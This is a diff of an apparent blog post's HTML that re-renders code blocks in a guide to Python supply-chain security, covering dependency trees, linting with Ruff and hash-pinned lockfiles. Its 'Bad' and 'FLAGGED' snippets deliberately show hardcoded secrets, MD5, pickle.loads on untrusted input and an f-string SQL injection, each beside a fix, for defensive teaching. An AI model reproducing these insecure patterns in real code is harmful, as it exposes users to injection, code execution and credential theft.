@@ -95,21 +95,21 @@ Actions workflows.</p><p>These aren&rsquo;t theoretical attacks. They happened t
 package on PyPI, you can report it through <a href=https://pypi.org/security/ target=_blank rel="noopener noreferrer">PyPI&rsquo;s security reporting system</a>
 .</p><h4 id=the-hidden-dependency-problem>The Hidden Dependency Problem
 <a class=heading-link href=#the-hidden-dependency-problem><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h4><p>When you install Flask, you&rsquo;re not just getting Flask. Here&rsquo;s the full dependency tree:</p><div class=code-block-wrapper><pre><code class=language-bash># Install Flask
-uv pip install flask
-
-# Show the full dependency tree
-uv pip tree
-
-# Output:
-flask v3.1.0
-├── blinker v1.9.0
-├── click v8.1.8
-├── itsdangerous v2.2.0
-├── jinja2 v3.1.5
-│   └── markupsafe v3.0.2
-└── werkzeug v3.1.3
-    └── markupsafe v3.0.2</code></pre></div><p>See what happened? You asked for one package (Flask), but you got seven. Look at MarkupSafe at the bottom - it&rsquo;s a
+<span class=sr-only>Link to heading</span></a></h4><p>When you install Flask, you&rsquo;re not just getting Flask. Here&rsquo;s the full dependency tree:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Install Flask</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> install</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> flask</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Show the full dependency tree</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> tree</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Output:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">flask</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v3.1.0</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">├──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> blinker</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v1.9.0</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">├──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> click</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v8.1.8</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">├──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> itsdangerous</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v2.2.0</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">├──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> jinja2</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v3.1.5</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">│</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">   └──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> markupsafe</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v3.0.2</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">└──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> werkzeug</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v3.1.3</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">    └──</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> markupsafe</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v3.0.2</span></span></code></pre></div><p>See what happened? You asked for one package (Flask), but you got seven. Look at MarkupSafe at the bottom - it&rsquo;s a
 transitive dependency pulled in by both Jinja2 and Werkzeug. You never explicitly installed it. You probably don&rsquo;t even
 know what it does. But if it has a vulnerability, your application is vulnerable.</p><p>With 50+ transitive dependencies per project on average, your attack surface is massive compared to what appears in your
 requirements file.</p><p>Now let&rsquo;s build your defense strategy, starting with your own code.</p><h3 id=secure-your-own-code-first>Secure Your Own Code First
@@ -122,37 +122,37 @@ automatically with a linter is the first layer of defense.</p><h4 id=the-forever
 <a class=heading-link href=#the-forever-secret><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><p>A leaked credential is the starting point for many supply chain compromises. An exposed PyPI token lets an attacker
 publish backdoored versions of your packages. An exposed database URL lets them exfiltrate data. Yet this pattern is
-depressingly common:</p><div class=code-block-wrapper><pre><code class=language-python># Bad: secrets in code live forever in git history
-SECRET_KEY = &#34;hunter2&#34;
-DATABASE_URL = &#34;postgres://admin:password123@prod-db:5432/app&#34;
-
-# Good: use environment variables
-import os
-
-SECRET_KEY = os.environ[&#34;SECRET_KEY&#34;]
-DATABASE_URL = os.environ[&#34;DATABASE_URL&#34;]</code></pre></div><p>Git never forgets. When you commit a secret, it lives in your repository&rsquo;s history forever. Deleting it in a later
+depressingly common:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Bad: secrets in code live forever in git history</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">SECRET_KEY </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "hunter2"</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">DATABASE_URL </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "postgres://admin:password123@prod-db:5432/app"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Good: use environment variables</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> os</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">SECRET_KEY </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#EBA0AC;--shiki-dark-font-style:italic">environ</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#A6E3A1;--shiki-dark-font-style:italic">SECRET_KEY</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">DATABASE_URL </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#EBA0AC;--shiki-dark-font-style:italic">environ</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#A6E3A1;--shiki-dark-font-style:italic">DATABASE_URL</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code></pre></div><p>Git never forgets. When you commit a secret, it lives in your repository&rsquo;s history forever. Deleting it in a later
 commit doesn&rsquo;t help — anyone with repository access (or an old clone) can extract those credentials. Attackers routinely
 trawl git histories for secrets, and a leaked PyPI token or cloud credential is often the first step in a supply chain
 compromise.</p><h4 id=broken-cryptography>Broken Cryptography
 <a class=heading-link href=#broken-cryptography><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h4><p>Another common vulnerability:</p><div class=code-block-wrapper><pre><code class=language-python># Bad: MD5 and SHA1 are broken
-import hashlib
-
-digest = hashlib.md5(payload).hexdigest()
-
-# Good: use SHA256 or better
-digest = hashlib.sha256(payload).hexdigest()</code></pre></div><p>MD5 collisions were first demonstrated in 2004, though weaknesses were known earlier. SHA1 practical collisions were
+<span class=sr-only>Link to heading</span></a></h4><p>Another common vulnerability:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Bad: MD5 and SHA1 are broken</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> hashlib</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">digest </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> hashlib</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">md5</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">payload</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">).</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">hexdigest</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Good: use SHA256 or better</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">digest </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> hashlib</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">sha256</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">payload</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">).</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">hexdigest</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">()</span></span></code></pre></div><p>MD5 collisions were first demonstrated in 2004, though weaknesses were known earlier. SHA1 practical collisions were
 demonstrated in 2017. Both were deprecated by NIST for digital signatures in 2011. &ldquo;Broken&rdquo; means attackers can generate
 collisions - different inputs producing the same hash. This enables certificate forgery, download tampering, or
 integrity check bypasses. Don&rsquo;t use either for security purposes.</p><h4 id=the-hanging-connection>The Hanging Connection
 <a class=heading-link href=#the-hanging-connection><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h4><p>This one is subtle but dangerous:</p><div class=code-block-wrapper><pre><code class=language-python># Bad: hangs indefinitely on slow/malicious servers
-import requests
-
-response = requests.get(&#34;https://api.example.com/data&#34;)
-
-# Good: always set timeouts
-response = requests.get(&#34;https://api.example.com/data&#34;, timeout=30)</code></pre></div><p>Without a timeout, a slow or malicious server can hang your process indefinitely. An attacker controlling a server your
+<span class=sr-only>Link to heading</span></a></h4><p>This one is subtle but dangerous:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Bad: hangs indefinitely on slow/malicious servers</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> requests</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">response </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> requests</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">get</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"https://api.example.com/data"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Good: always set timeouts</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">response </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> requests</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">get</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"https://api.example.com/data"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#EBA0AC;--shiki-dark-font-style:italic"> timeout</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387">30</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span></span></code></pre></div><p>Without a timeout, a slow or malicious server can hang your process indefinitely. An attacker controlling a server your
 application talks to can make every request hang, exhausting your thread pool and causing a denial-of-service. Your
 whole application grinds to a halt because you forgot one parameter.</p><h4 id=catch-these-with-ruff>Catch These With Ruff
 <a class=heading-link href=#catch-these-with-ruff><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
@@ -162,20 +162,20 @@ is a blazingly fast Python linter that includes comprehensive security rules fro
 . You can learn more in the
 <a href=https://docs.astral.sh/ruff/rules/#flake8-bandit-s target=_blank rel="noopener noreferrer">Ruff security rules documentation</a>
 . Configure it in
-<code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pyproject</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">toml</span></span></code>:</p><div class=code-block-wrapper><pre><code class=language-toml># Start with errors, pyflakes, and security rules
-[tool.ruff]
-line-length = 120
-lint.select = [&#34;E&#34;, &#34;F&#34;, &#34;S&#34;]</code></pre></div><p>The security rules (<code class="shiki-inline"><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"S"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code>) alone provide significant value — they&rsquo;re the Bandit checks that catch hardcoded secrets,
-weak crypto, and unsafe deserialization. Once your codebase is clean, expand to all rules:</p><div class=code-block-wrapper><pre><code class=language-toml># Aspirational: enable everything and selectively ignore
-[tool.ruff]
-line-length = 120
-lint.select = [&#34;ALL&#34;]
-lint.ignore = [
-  &#34;COM812&#34;, # conflicts with formatter
-  &#34;CPY&#34;,    # no copyright
-  &#34;D&#34;,      # pydocstyle: enable later for public APIs if publishing a library
-  &#34;ISC001&#34;, # conflicts with formatter
-]</code></pre></div><p>Ruff runs in under a second, so you can run it as you type in your IDE and before every commit. All three
+<code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pyproject</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">toml</span></span></code>:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Start with errors, pyflakes, and security rules</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">tool.ruff</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">line-length </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387"> 120</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">lint</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">select </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"E"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "F"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "S"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code></pre></div><p>The security rules (<code class="shiki-inline"><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"S"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code>) alone provide significant value — they&rsquo;re the Bandit checks that catch hardcoded secrets,
+weak crypto, and unsafe deserialization. Once your codebase is clean, expand to all rules:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Aspirational: enable everything and selectively ignore</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">tool.ruff</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">line-length </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387"> 120</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">lint</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">select </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"ALL"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">lint</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">ignore </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">  "COM812"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # conflicts with formatter</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">  "CPY"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">    # no copyright</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">  "D"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">      # pydocstyle: enable later for public APIs if publishing a library</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">  "ISC001"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # conflicts with formatter</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code></pre></div><p>Ruff runs in under a second, so you can run it as you type in your IDE and before every commit. All three
 vulnerabilities above get caught automatically:</p><ul><li><a href=https://docs.astral.sh/ruff/rules/hardcoded-password-string/ target=_blank rel="noopener noreferrer"><strong>S105</strong></a>
 - hardcoded secrets,</li><li><a href=https://docs.astral.sh/ruff/rules/hashlib-insecure-hash-function/ target=_blank rel="noopener noreferrer"><strong>S324</strong></a>
 - weak cryptography,</li><li><a href=https://docs.astral.sh/ruff/rules/request-without-timeout/ target=_blank rel="noopener noreferrer"><strong>S113</strong></a>
@@ -184,13 +184,13 @@ vulnerabilities above get caught automatically:</p><ul><li><a href=https://docs.
 - SQL injection via string formatting,</li><li><a href=https://docs.astral.sh/ruff/rules/suspicious-eval-usage/ target=_blank rel="noopener noreferrer"><strong>S307</strong></a>
 - using eval() with untrusted input.</li></ul><p>Each linked rule page includes a detailed explanation of why the pattern is dangerous, examples of vulnerable code, and
 how to fix it - worth reading if you want to understand the risks beyond just silencing the warning. For example, this
-dangerous pattern gets flagged immediately:</p><div class=code-block-wrapper><pre><code class=language-python># FLAGGED: S301 - pickle.loads() can execute arbitrary code
-import pickle
-
-data = pickle.loads(untrusted_input)  # Use json.loads() instead
-
-# FLAGGED: S608 - SQL injection vulnerability
-cursor.execute(f&#34;SELECT * FROM users WHERE name = &#39;{user_input}&#39;&#34;)</code></pre></div><p>Add Ruff to your editor and CI pipeline - it&rsquo;ll save your forgetful self.</p><h3 id=manage-your-dependencies>Manage Your Dependencies
+dangerous pattern gets flagged immediately:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># FLAGGED: S301 - pickle.loads() can execute arbitrary code</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> pickle</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">data </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> pickle</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">loads</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">untrusted_input</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">  # Use json.loads() instead</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># FLAGGED: S608 - SQL injection vulnerability</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">cursor</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">execute</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#A6E3A1;--shiki-dark-font-style:italic">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"SELECT * FROM users WHERE name = '</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F5C2E7">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">user_input</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F5C2E7">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">'"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span></span></code></pre></div><p>Add Ruff to your editor and CI pipeline - it&rsquo;ll save your forgetful self.</p><h3 id=manage-your-dependencies>Manage Your Dependencies
 <a class=heading-link href=#manage-your-dependencies><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h3><p>Now let&rsquo;s talk about managing the code you didn&rsquo;t write — your dependencies. This is where supply chain attacks actually
 happen. The <a href=https://github.com/ossf/s2c2f target=_blank rel="noopener noreferrer">OpenSSF Secure Supply Chain Consumption Framework (S2C2F)</a>
@@ -251,14 +251,14 @@ makes hash pinning effortless by generating lockfiles with cryptographic hashes 
 default. It also creates isolated virtual environments automatically, limiting the blast radius if a dependency turns
 out to be malicious — a compromised package can&rsquo;t affect other projects or system-level resources. See the
 <a href=https://docs.astral.sh/uv/concepts/projects/#lockfile target=_blank rel="noopener noreferrer">uv lockfile documentation</a>
-for details:</p><div class=code-block-wrapper><pre><code class=language-bash>uv lock
-uv sync</code></pre></div><p>For requirements files with hashes (see <a href=https://docs.astral.sh/uv/reference/cli/#uv-pip-compile target=_blank rel="noopener noreferrer">uv pip compile docs</a>
-):</p><div class=code-block-wrapper><pre><code class=language-bash># From a requirements.in file:
-uv pip compile --generate-hashes requirements.in -o requirements.txt
-# Or from a uv project (hashes included by default):
-uv export --format requirements-txt -o requirements.txt</code></pre></div><p>If you&rsquo;re not ready to switch to uv yet, <a href=https://github.com/jazzband/pip-tools target=_blank rel="noopener noreferrer">pip-tools</a>
